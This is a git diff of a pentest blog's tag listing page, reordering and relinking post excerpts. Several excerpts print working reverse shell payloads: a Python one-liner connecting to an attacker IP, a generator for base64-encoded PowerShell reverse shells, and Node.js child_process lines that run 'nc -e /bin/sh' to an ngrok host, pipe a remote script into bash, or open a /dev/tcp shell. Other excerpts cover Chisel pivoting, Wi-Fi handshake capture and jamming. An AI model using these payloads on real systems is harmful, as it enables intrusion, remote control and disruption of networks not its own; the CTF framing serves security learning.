@@ -173,79 +173,6 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🐉 Kali Docker Persistent Container
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>📂 Files Dockerfile (placed in empty folder)
-FROM kalilinux/kali-rolling ENV DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC # install essentials: zsh sudo tzdata chrony util-linux iproute2 RUN apt update &amp;&amp; apt install -y \ zsh sudo tzdata chrony util-linux iproute2 \ &amp;&amp; useradd -m -s /usr/bin/zsh kali \ &amp;&amp; echo &#34;kali:kali&#34; | chpasswd \ &amp;&amp; usermod -aG sudo kali \ &amp;&amp; apt clean &amp;&amp; rm -rf /var/lib/apt/lists/* USER kali WORKDIR /home/kali ENTRYPOINT [&#34;/usr/bin/zsh&#34;,&#34;-l&#34;] 🛠️ Build Image Run from the folder with Dockerfile
-docker build -t kali-zsh-vm:privileged . 🚀 Create and Run Persistent Privileged Container This creates kali-persistent with host timezone and /tmp/test mounted
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🐉 Kali Docker Persistent Container" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/kali-docker-persistent-container/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🐍 Python Reverse Shell Cheat Sheet
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>This cheat sheet shows useful Python reverse shell one-liners and a PowerShell reverse shell generator in Python.
-1. Python3 Reverse Shell One-liner python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.9.50.114&#34;,3232));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Connects back to attacker IP 10.9.50.114 on port 3232. Uses socket, duplicates file descriptors for stdin/stdout/stderr. Spawns an interactive /bin/sh shell. Works on most Linux systems with Python 3 installed. 2. Python Script to Generate PowerShell Reverse Shell Command (Base64 Encoded) #!/usr/bin/env python3 import sys import base64 def help(): print(&#34;USAGE: %s IP PORT&#34; % sys.argv[0]) print(&#34;Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT&#34;) exit() try: (ip, port) = (sys.argv[1], int(sys.argv[2])) except: help() payload = &#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;%s&#34;,%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#34;PS &#34; &#43; (pwd).Path &#43; &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39; payload = payload % (ip, port) cmdline = &#34;powershell -e &#34; &#43; base64.b64encode(payload.encode(&#39;utf16&#39;)[2:]).decode() print(cmdline) How to use: Run this script:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🐍 Python Reverse Shell Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/-python-reverse-shell-cheat-sheet/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🐚 JavaScript Reverse Shell &amp; Command Execution Cheat Sheet
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Useful JavaScript snippets for remote command execution, reverse shells, and post-exploitation via Node.js or vulnerable eval() injection.
-📄 Basic Reverse Shell using child_process.exec() require(&#39;child_process&#39;).exec(&#39;nc 0.tcp.in.ngrok.io 18402 -e /bin/sh&#39;) 📌 Listener on attacker side: nc -lvnp 18402 📄 Spawn a shell via spawn() method require(&#39;child_process&#39;).spawn(&#39;/bin/sh&#39;, []) This spawns an interactive shell on the server if injected.
-📄 Execute a simple Linux command require(&#39;child_process&#39;).exec(&#39;ls -la&#39;, function(error, stdout, stderr) { console.log(stdout) }) 📄 Download and execute a script (e.g., reverse shell script) require(&#39;child_process&#39;).exec(&#39;curl http://10.10.14.5/rev.sh | bash&#39;) 📄 Reverse shell using bash and TCP require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1&#39;) 💡 Use this when nc -e is restricted or not available.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🐚 JavaScript Reverse Shell & Command Execution Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/-javascript-reverse-shell--command-execution-cheat-sheet/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">📡 Wi-Fi Handshake Capture Guide using aircrack-ng Tools
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 🔍 1. Scan Available WiFi Networks 🌐 Scan all nearby WiFi networks sudo airodump-ng mon0 📶 Scan only 2.4 GHz networks (802.11b/g) sudo airodump-ng --band bg mon0 📡 Scan only 5 GHz networks (802.11a) sudo airodump-ng --band a mon0 📋 Band Option Summary --band a → 5 GHz (802.11a) --band b → 2.4 GHz (802.11b) --band g → 2.4 GHz (802.11g) --band bg → All 2.4 GHz (recommended) --band abg → Both 2.4 GHz and 5 GHz 🎯 2. Capture WPA/WPA2 Handshake 🎯 Start listening on target AP # Replace &lt;channel&gt;, &lt;BSSID&gt;, and &lt;output_filename&gt; sudo airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;output_filename&gt; mon0 Example
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📡 Wi-Fi Handshake Capture Guide using aircrack-ng Tools" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🔐 File Transfer Over SSH Using `scp`
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 📤 Uploading/Sending a Directory from Local to SSH Server Use either of the following commands:
-scp -P 22 -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/ OR
-scp -r -P 22 ./shell u0_a418@192.168.0.20:/home/gnu/shell/ 📥 Downloading/Receiving a Directory from SSH Server to Local scp -P 22 -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/ OR
-scp -r -P 22 u0_a418@192.168.0.20:/home/gnu ./gnu/ 📤 Uploading/Sending a File from Local to SSH Server scp -P 22 ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php 📥 Downloading/Receiving a File from SSH Server to Local scp -P 22 u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt 📝 Note:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🔐 File Transfer Over SSH Using `scp`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
     <h2 class="entry-hint-parent">Basic Reverse Shell Payloads
     </h2>
   </header>
@@ -254,7 +181,22 @@ scp -r -P 22 u0_a418@192.168.0.20:/home/gnu ./gnu/ 📤 Uploading/Sending a File
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to Basic Reverse Shell Payloads" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/bash_command_revshell/"></a>
+  <a class="entry-link" aria-label="post link to Basic Reverse Shell Payloads" href="http://localhost:1313/posts/penetration-testing/webvulnerability/bash_command_revshell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Chisel Port Forwarding Guide
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 🧠 What is Chisel? Chisel is a fast TCP/UDP tunnel over HTTP, useful for port forwarding and pivoting, especially during red teaming or CTFs.
+🔥 Attacker Machine Setup (Chisel Server) Start Chisel in reverse mode on the attacker machine:
+./chisel_1.5.1 server -p 9005 --reverse -p 9005: Listen on port 9005 --reverse: Accept reverse port forwarding connections 🎯 Target Machine Setup (Chisel Client) Forward all traffic to attacker: ./chisel client 10.10.14.19:9005 R:socks This sets up a SOCKS proxy from the target to the attacker’s Chisel server
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Chisel Port Forwarding Guide" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -268,7 +210,7 @@ id=[Nothing] id=&#39; id=&#39;&#39; id=&#34; id=` id=&#39;) id=&#34;) id=`) id=&
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to Comprehensive SQL Injection Vulnerability Exploration Tutorial" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/sql_injection_cheat_sheet/"></a>
+  <a class="entry-link" aria-label="post link to Comprehensive SQL Injection Vulnerability Exploration Tutorial" href="http://localhost:1313/posts/penetration-testing/webvulnerability/sql_injection_cheat_sheet/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -297,7 +239,23 @@ There are two different types. Local File Inclusion (LFI) where the application 
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>6 min</span></footer>
-  <a class="entry-link" aria-label="post link to File Inclusion" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/lfi/"></a>
+  <a class="entry-link" aria-label="post link to File Inclusion" href="http://localhost:1313/posts/penetration-testing/webvulnerability/lfi/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Transfer Over SSH Using `scp`
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 📤 Uploading/Sending a Directory from Local to SSH Server Use either of the following commands:
+scp -P 22 -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/ OR
+scp -r -P 22 ./shell u0_a418@192.168.0.20:/home/gnu/shell/ 📥 Downloading/Receiving a Directory from SSH Server to Local scp -P 22 -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/ OR
+scp -r -P 22 u0_a418@192.168.0.20:/home/gnu ./gnu/ 📤 Uploading/Sending a File from Local to SSH Server scp -P 22 ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php 📥 Downloading/Receiving a File from SSH Server to Local scp -P 22 u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt 📝 Note:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Transfer Over SSH Using `scp`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -312,7 +270,54 @@ There are two different types. Local File Inclusion (LFI) where the application 
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
-  <a class="entry-link" aria-label="post link to HTTP Status Code" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/http_status_code/"></a>
+  <a class="entry-link" aria-label="post link to HTTP Status Code" href="http://localhost:1313/posts/penetration-testing/webvulnerability/http_status_code/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Jamming Wi-Fi with `mdk4`
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>With the mdk4 tool, you can jam Wi-Fi networks in various ways. This guide will walk you through the installation, setup, and usage of mdk4, including examples for different attacks.
+1. Installation If mdk4 is not installed on your system, install it using the following command:
+sudo apt-get install mdk4 -y Switching to Root User If you are not the root user, switch to root:
+sudo su Example:
+kali@gajendra:~$ sudo su 2. Checking Network Interface Status Check your network interface status to see if it’s in monitor mode:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>4 min</span></footer>
+  <a class="entry-link" aria-label="post link to Jamming Wi-Fi with `mdk4`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/wifi-jam-tutorials-by-mdk3_mdk4_aireplayng/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">JavaScript Reverse Shell &amp; Command Execution Cheat Sheet
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Useful JavaScript snippets for remote command execution, reverse shells, and post-exploitation via Node.js or vulnerable eval() injection.
+📄 Basic Reverse Shell using child_process.exec() require(&#39;child_process&#39;).exec(&#39;nc 0.tcp.in.ngrok.io 18402 -e /bin/sh&#39;) 📌 Listener on attacker side: nc -lvnp 18402 📄 Spawn a shell via spawn() method require(&#39;child_process&#39;).spawn(&#39;/bin/sh&#39;, []) This spawns an interactive shell on the server if injected.
+📄 Execute a simple Linux command require(&#39;child_process&#39;).exec(&#39;ls -la&#39;, function(error, stdout, stderr) { console.log(stdout) }) 📄 Download and execute a script (e.g., reverse shell script) require(&#39;child_process&#39;).exec(&#39;curl http://10.10.14.5/rev.sh | bash&#39;) 📄 Reverse shell using bash and TCP require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/9001 0&gt;&amp;1&#39;) 💡 Use this when nc -e is restricted or not available.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to JavaScript Reverse Shell & Command Execution Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/-javascript-reverse-shell--command-execution-cheat-sheet/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Kali Docker Persistent Container
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>📂 Files Dockerfile (placed in empty folder)
+FROM kalilinux/kali-rolling ENV DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC # install essentials: zsh sudo tzdata chrony util-linux iproute2 RUN apt update &amp;&amp; apt install -y \ zsh sudo tzdata chrony util-linux iproute2 \ &amp;&amp; useradd -m -s /usr/bin/zsh kali \ &amp;&amp; echo &#34;kali:kali&#34; | chpasswd \ &amp;&amp; usermod -aG sudo kali \ &amp;&amp; apt clean &amp;&amp; rm -rf /var/lib/apt/lists/* USER kali WORKDIR /home/kali ENTRYPOINT [&#34;/usr/bin/zsh&#34;,&#34;-l&#34;] 🛠️ Build Image Run from the folder with Dockerfile
+docker build -t kali-zsh-vm:privileged . 🚀 Create and Run Persistent Privileged Container This creates kali-persistent with host timezone and /tmp/test mounted
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Kali Docker Persistent Container" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/kali-docker-persistent-container/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
@@ -348,7 +353,9 @@ There are two different types. Local File Inclusion (LFI) where the application 
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
